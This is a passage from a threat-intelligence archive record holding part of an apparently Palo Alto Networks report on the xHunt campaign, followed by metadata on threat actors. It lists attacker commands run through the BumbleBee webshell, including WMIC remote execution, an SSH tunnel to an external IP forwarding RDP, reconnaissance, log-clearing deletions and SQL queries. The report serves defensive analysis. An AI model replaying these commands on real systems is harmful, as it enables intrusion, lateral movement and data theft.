443\"\n\n\n[T1047,](https://attack.mitre.org/techniques/T1047/)\n[T1572,](https://attack.mitre.org/techniques/T1572/)\n[T1021.001](https://attack.mitre.org/techniques/T1021/001/)\n\n[T1047,](https://attack.mitre.org/techniques/T1047/)\n[T1572,](https://attack.mitre.org/techniques/T1572/)\n[T1021.001](https://attack.mitre.org/techniques/T1021/001/)\n\n\n15:56:55 del \\<redacted IP #3>\\C$:\\windows\\temp\\RTQ.exe [T1070.004,](https://attack.mitre.org/techniques/T1070/004/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n15:57:03 del \\<redacted IP #3>\\C$\\windows\\temp\\RTQ.exe [T1070.004,](https://attack.mitre.org/techniques/T1070/004/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n15:57:10 del \\<redacted IP #3>\\C$\\windows\\temp\\RTQ.exe /F [T1070.004,](https://attack.mitre.org/techniques/T1070/004/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n15:58:00 wmic /node:\"<redacted IP #3>\" /user:<redacted domain>\\\n<redacted username #2> /PASSWORD:<redacted password #1>\nprocess call create \"cmd.exe /c del c:\\windows\\temp\\RTQ.exe /F\"\n\n15:58:05 wmic /node:\"<redacted IP #3>\" /user:<redacted domain>\\\n<redacted username #2> /PASSWORD:<redacted password #1>\nprocess call create \"cmd.exe /c del c:\\windows\\temp\\RTQ.exe\"\n\n\n[T1047,](https://attack.mitre.org/techniques/T1047/)\n[T1070.004](https://attack.mitre.org/techniques/T1070/004/)\n\n[T1047,](https://attack.mitre.org/techniques/T1047/)\n[T1070.004](https://attack.mitre.org/techniques/T1070/004/)\n\n\n15:58:19 dir \\<redacted IP #3>\\C$:\\windows\\temp\\*.exe [T1083,](https://attack.mitre.org/techniques/T1083/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n15:58:25 dir \\<redacted IP #3>\\C$\\windows\\temp\\*.exe [T1083,](https://attack.mitre.org/techniques/T1083/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n15:58:38 dir \\<redacted IP #3>\\C$\\windows\\temp\\r.txt [T1083,](https://attack.mitre.org/techniques/T1083/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n15:58:43 del \\<redacted IP #3>\\C$\\windows\\temp\\r.txt [T1070.004,](https://attack.mitre.org/techniques/T1070/004/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n15:59:25 wmic /node:\"<redacted IP #3>\" /user:<redacted domain>\\\n<redacted username #2> /PASSWORD:<redacted password #1>\nprocess call create \"cmd.exe /c tasklist > C:\\windows\\temp\\r.txt\"\n\n\n[T1047](https://attack.mitre.org/techniques/T1047/)\n\n\n15:59:29 type \\<redacted IP #3>\\C$\\windows\\temp\\r.txt [T1039,](https://attack.mitre.org/techniques/T1039/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n-----\n\n15:59:48 wmic /node:\"<redacted IP #3>\" /user:<redacted domain>\\\n<redacted username #2> /PASSWORD:<redacted password #1>\nprocess call create \"cmd.exe /c taskkill /IM \"RTQ.exe\" /F\"\n\n\n[T1047](https://attack.mitre.org/techniques/T1047/)\n\n\n15:59:55 dir c:\\windows\\temp\\*.exe [T1083](https://attack.mitre.org/techniques/T1083/)\n\n15:59:58 dir \\<redacted IP #3>\\C$:\\windows\\temp\\*.exe [T1083,](https://attack.mitre.org/techniques/T1083/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:00:04 dir \\<redacted IP #3>\\C$\\windows\\temp\\*.exe [T1083,](https://attack.mitre.org/techniques/T1083/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:00:09 del \\<redacted IP #3>\\C$\\windows\\temp\\*.exe [T1083,](https://attack.mitre.org/techniques/T1083/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:00:14 dir \\<redacted IP #3>\\C$\\windows\\temp\\*.exe [T1083,](https://attack.mitre.org/techniques/T1083/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:00:24 del \\<redacted IP #3>\\C$\\windows\\temp\\r.txt [T1070.004,](https://attack.mitre.org/techniques/T1070/004/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:00:29 net use * /DELETE /y [T1070.004,](https://attack.mitre.org/techniques/T1070/004/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n16:02:48 powershell -c \"Test-NetConnection -ComputerName <redacted IP\n#2> -Port 80 -InformationLevel \"Detailed\"\n\n16:04:36 powershell -c \"Test-NetConnection -ComputerName <redacted IP\n#2> -Port 3389 -InformationLevel \"Detailed\"\n\n16:07:23 powershell -c \"Test-NetConnection -ComputerName <redacted IP\n#2> -Port 389 -InformationLevel \"Detailed\"\n\n\n[T1046,](https://attack.mitre.org/techniques/T1046/)\n[T1059.001](https://attack.mitre.org/techniques/T1059/001/)\n\n[T1046,](https://attack.mitre.org/techniques/T1046/)\n[T1059.001](https://attack.mitre.org/techniques/T1059/001/)\n\n[T1046,](https://attack.mitre.org/techniques/T1046/)\n[T1059.001](https://attack.mitre.org/techniques/T1059/001/)\n\n\n16:07:55 quser /server:<redacted IP #1> [T1087](https://attack.mitre.org/techniques/T1087/)\n\n\n16:08:42 echo y | c:\\windows\\temp\\RTQ.exe 192.119.110[.]194 -C -R\n0.0.0.0:8081:<redacted IP #1>:3389 -l bor -pw 123321 -P 443\n\n16:09:03 wmic /node:\"127.0.0.1\" /user:administrator /PASSWORD:\"\n<redacted password #2>\" process call create \"cmd.exe /c\nwhoami\"\n\n\n[T1572,](https://attack.mitre.org/techniques/T1572/)\n[T1021.001](https://attack.mitre.org/techniques/T1021/001/)\n\n[T1047,](https://attack.mitre.org/techniques/T1047/)\n[T1033](https://attack.mitre.org/techniques/T1033/)\n\n\n16:09:15 ipconfig/all [T1016](https://attack.mitre.org/techniques/T1016/)\n\n\n16:09:35 wmic /node:\"Exchange\" /user:administrator /PASSWORD:\"\n<redacted password #2>\" process call create \"cmd.exe /c\nwhoami\"\n\n16:10:35 net use \\<redacted IP #1>\\C$ /user:<redacted domain>\\<redacted\nusername #2> <redacted password #1>\n\n\n[T1047,](https://attack.mitre.org/techniques/T1047/)\n[T1033](https://attack.mitre.org/techniques/T1033/)\n\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n16:10:45 quser /server:<redacted IP #4> [T1087](https://attack.mitre.org/techniques/T1087/)\n\n\n-----\n\n16:13:17 ipconfig/all [T1016](https://attack.mitre.org/techniques/T1016/)\n\n\n16:13:27 wmic /node:\"<redacted IP #1>\" /user:<redacted domain>\\\n<redacted username #2> /PASSWORD:<redacted password #1>\nprocess call create \"cmd.exe /c c:\\windows\\temp\\RTQ.exe\nwhoami\"\n\n\n[T1047,](https://attack.mitre.org/techniques/T1047/)\n[T1033](https://attack.mitre.org/techniques/T1033/)\n\n\n16:14:20 type \\<redacted IP #1>\\C$\\windows\\temp\\w.txt [T1039,](https://attack.mitre.org/techniques/T1039/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:14:30 dir \\<redacted IP #1>\\C$\\windows\\temp\\*.txt [T1083,](https://attack.mitre.org/techniques/T1083/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n16:14:56 wmic /node:\"<redacted IP #1>\" /user:<redacted domain>\\\n<redacted username #2> /PASSWORD:<redacted password #1>\nprocess call create \"cmd.exe /c tasklist > c:\\windows\\temp\\ww.txt\"\n\n\n[T1047](https://attack.mitre.org/techniques/T1047/)\n\n\n16:15:28 dir \\<redacted IP #1>\\c$\\windows\\temp\\*txt [T1083,](https://attack.mitre.org/techniques/T1083/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:15:36 type \\<redacted IP #1>\\c$\\windows\\temp\\ww.txt [T1039,](https://attack.mitre.org/techniques/T1039/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n16:17:54 powershell -c Test-NetConnection -ComputerName <redacted IP\n#1> -Port 3389\n\n16:19:28 powershell -c Test-NetConnection -ComputerName <redacted IP\n#2> -Port 3389\n\n16:19:32 wmic /node:\"<redacted IP #1>\" /user:<redacted domain>\\\n<redacted username #2> /PASSWORD:<redacted password #1>\nprocess call create \"cmd /c powershell -c Test-NetConnection ComputerName <redacted IP #2> -Port 3389 >\nc:\\windows\\temp\\r.txt\"\n\n\n[T1046,](https://attack.mitre.org/techniques/T1046/)\n[T1059.001](https://attack.mitre.org/techniques/T1059/001/)\n\n[T1046,](https://attack.mitre.org/techniques/T1046/)\n[T1059.001](https://attack.mitre.org/techniques/T1059/001/)\n\n[T1046,](https://attack.mitre.org/techniques/T1046/)\n[T1047,](https://attack.mitre.org/techniques/T1047/)\n[T1059.001,](https://attack.mitre.org/techniques/T1059/001/)\n[T1021.001](https://attack.mitre.org/techniques/T1021/001/)\n\n\n16:20:00 type \\<redacted IP #1>\\C$\\windows\\temp\\r.txt [T1039,](https://attack.mitre.org/techniques/T1039/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:20:34 ping -n 1 -a <redacted IP #2> [T1018](https://attack.mitre.org/techniques/T1018/)\n\n\n16:21:29 wmic /node:\"<redacted IP #2>\" /user:administrator /PASSWORD:\"\n<redacted password #2>\" process call create \"cmd.exe /c\nwhoami\"\n\n16:22:06 wmic /node:\"<redacted IP #2>\" /user:administrator /PASSWORD:\"\n<redacted password #2>\" process call create \"cmd.exe /c\nwhoami\"\n\n\n[T1047,](https://attack.mitre.org/techniques/T1047/)\n[T1033](https://attack.mitre.org/techniques/T1033/)\n\n[T1047,](https://attack.mitre.org/techniques/T1047/)\n[T1033](https://attack.mitre.org/techniques/T1033/)\n\n\n16:22:59 net use [T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:23:07 dir \\<redacted IP #1>\\C$\\windows\\temp\\*.txt [T1083,](https://attack.mitre.org/techniques/T1083/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n-----\n\n16:23:16 type \\<redacted IP #1>\\C$\\windows\\temp\\teredo.txt [T1039,](https://attack.mitre.org/techniques/T1039/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:23:27 del \\<redacted IP #1>\\C$\\windows\\temp\\ww.txt [T1070.004,](https://attack.mitre.org/techniques/T1070/004/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:23:29 del \\<redacted IP #1>\\C$\\windows\\temp\\r.txt [T1070.004,](https://attack.mitre.org/techniques/T1070/004/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:23:43 net use * /DELETE /y [T1070.004,](https://attack.mitre.org/techniques/T1070/004/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n17:21:19 del owafont_ja.aspx /F [T1505.003,](https://attack.mitre.org/techniques/T1505/003/)\n[T1070.004](https://attack.mitre.org/techniques/T1070/004/)\n\n_Table 2. Commands the actor ran using BumbleBee webshell on the compromised Exchange server._\n\n**Commands Executed via BumbleBee on IIS Web Server**\n\n\n**Time** **Webshell**\n**Filename**\n\n\n**Command** **ATT&CK TIDs**\n\n\n9/10/20\n20:47:36\n\n9/10/20\n20:48:03\n\n9/10/20\n20:48:20\n\n9/10/20\n20:48:29\n\n9/10/20\n20:48:33\n\n9/10/20\n20:49:19\n\n9/10/20\n20:49:27\n\n9/10/20\n20:49:35\n\n9/10/20\n20:49:44\n\n\nShowDoc.aspx hostname & whoami & ipconfig/all & route print\n& arp -a\n\n\n[T1082,](https://attack.mitre.org/techniques/T1082/)\n[T1033,](https://attack.mitre.org/techniques/T1033/)\n\n[T1016](https://attack.mitre.org/techniques/T1016/)\n\n\nShowDoc.aspx ping -n 1 -a <redacted IP> [T1018](https://attack.mitre.org/techniques/T1018/)\n\nShowDoc.aspx ping -n 1 -a <redacted domain> [T1018](https://attack.mitre.org/techniques/T1018/)\n\nShowDoc.aspx net users /domain [T1087.002](https://attack.mitre.org/techniques/T1087/002/)\n\nShowDoc.aspx ipconfig/all [T1016](https://attack.mitre.org/techniques/T1016/)\n\nShowDoc.aspx echo %USERDOMAIN% [T1016](https://attack.mitre.org/techniques/T1016/)\n\nShowDoc.aspx net users /domain [T1087.002](https://attack.mitre.org/techniques/T1087/002/)\n\nShowDoc.aspx net users [T1087.001](https://attack.mitre.org/techniques/T1087/001/)\n\nShowDoc.aspx net localgroup administrators [T1087.001](https://attack.mitre.org/techniques/T1087/001/)\n\n\n-----\n\n9/10/20\n20:50:16\n\n9/10/20\n20:50:21\n\n9/10/20\n20:50:40\n\n9/10/20\n20:51:16\n\n9/10/20\n20:51:37\n\n9/10/20\n20:51:45\n\n9/10/20\n20:52:27\n\n\nShowDoc.aspx net view [T1135](https://attack.mitre.org/techniques/T1135/)\n\nShowDoc.aspx type ..\\..\\web.config [T1005](https://attack.mitre.org/techniques/T1005/)\n\nShowDoc.aspx ** Uploads cq.aspx webshell ** [T1505.003](https://attack.mitre.org/techniques/T1505/003/)\n\n\ncq.aspx powershell -C \"$conn=new-object\nSystem.Data.SqlClient.SQLConnection(\"\"\"\n<redacted SQL connection>\"\"\");Try {\n$conn.Open(); }Catch { continue; }$cmd =\nnew-object\nSystem.Data.SqlClient.SqlCommand(\"\"\"select\n@@version;\"\"\",$conn);$ds=New-Object\nsystem.Data.DataSet;$da=New-Object\nsystem.Data.SqlClient.SqlDataAdapter($cmd);\n\n[void]$da.fill($ds);$ds.Tables[0];$conn.Close();\"\n\ncq.aspx powershell -C \"$conn=new-object\nSystem.Data.SqlClient.SQLConnection(\"\"\"\n<redacted SQL connection>\"\"\");Try {\n$conn.Open(); }Catch { continue; }$cmd =\nnew-object\nSystem.Data.SqlClient.SqlCommand(\"\"\"\n<redacted SQL query>\"\"\",$conn);$ds=NewObject system.Data.DataSet;$da=New-Object\nsystem.Data.SqlClient.SqlDataAdapter($cmd);\n\n[void]$da.fill($ds);$ds.Tables[0];$conn.Close();\"\n\ncq.aspx powershell -C \"$conn=new-object\nSystem.Data.SqlClient.SQLConnection(\"\"\"\n<redacted SQL connection>\"\"\");Try {\n$conn.Open(); }Catch { continue; }$cmd =\nnew-object\nSystem.Data.SqlClient.SqlCommand(\"\"\"\n<redacted SQL query>\"\"\",$conn);$ds=NewObject system.Data.DataSet;$da=New-Object\nsystem.Data.SqlClient.SqlDataAdapter($cmd);\n\n[void]$da.fill($ds);$ds.Tables[0];$conn.Close();\"\n\n\n[T1059.001,](https://attack.mitre.org/techniques/T1059/001/)\n[T1213](https://attack.mitre.org/techniques/T1213/)\n\n[T1059.001,T1213](https://attack.mitre.org/techniques/T1059/001/)\n\n[T1059.001,T1213](https://attack.mitre.org/techniques/T1059/001/)\n\n\nShowDoc.aspx del cq.aspx [T1070.004](https://attack.mitre.org/techniques/T1070/004/)\n\n\n_Table 3. Commands the actor ran using BumbleBee webshell hosted at second Kuwaiti organization._\n\n**Get updates from**\n\n**Palo Alto**\n\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n\n-----\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\nStatement.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-01-11 - xHunt Campaign- New BumbleBee Webshell and SSH Tunnels Used for Lateral Movement.pdf"
    ],
    "report_names": [
        "2021-01-11 - xHunt Campaign- New BumbleBee Webshell and SSH Tunnels Used for Lateral Movement.pdf"
    ],
    "threat_actors": [
        {
            "id": "21e998eb-31c8-4281-be1d-1a5133330eb9",
            "created_at": "2023-01-06T13:46:39.14468Z",
            "updated_at": "2025-03-27T02:00:03.007083Z",
            "deleted_at": null,
            "main_name": "COBALT KATANA",
            "aliases": [
                "Hive0081 (IBM)",
                "SectorD01 (NHSC)",
                "xHunt campaign (Palo Alto)",
                "Hunter Serpens"
            ],
            "source_name": "MISPGALAXY:COBALT KATANA",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "dc74686b-db66-426a-95bb-d4ce8ef7e967",
            "created_at": "2024-05-01T02:03:08.033074Z",
            "updated_at": "2025-03-27T02:05:17.31649Z",
            "deleted_at": null,
            "main_name": "COBALT KATANA",
            "aliases": [
                "SectorD01 ",
                "xHunt campaign ",
                "Hive0081 "
            ],
            "source_name": "Secureworks:COBALT KATANA",
            "tools": [
                " Diezen",
                " Eye",
                " Gon",
                " Hisoka",
                " Hisoka Netero",
                " HyphenShell",
                " Killua",
                " Sakabota",
                " Sakabota Framework",
                "CASHY200"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "20bc5b83-9ea0-4e60-a23e-19bf203dc9fb",
            "created_at": "2022-10-25T16:07:24.432777Z",
            "updated_at": "2025-03-27T02:02:10.220082Z",
            "deleted_at": null,
            "main_name": "xHunt",
            "aliases": [
                "Cobalt Katana",
                "Hive0081",
                "Hunter Serpens",
                "SectorD01"
            ],
            "source_name": "ETDA:xHunt",
            "tools": [
                "CASHY200",
                "COLDTRAIN",
                "Gon",
                "Hisoka",
                "Killua",
                "Netero",
                "SHELLSTING",
                "Sakabota",
                "Snugy",
                "TriFive"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536189,
    "ts_updated_at": 1743041764,
    "ts_creation_date": 1660794875,
    "ts_modification_date": 1660794875,
    "files": {
        "pdf": "https://archive.orkl.eu/ccb5d8080be69403833fa308907a2511a1a34334.pdf",
        "text": "https://archive.orkl.eu/ccb5d8080be69403833fa308907a2511a1a34334.txt",
        "img": "https://archive.orkl.eu/ccb5d8080be69403833fa308907a2511a1a34334.jpg"
    }
}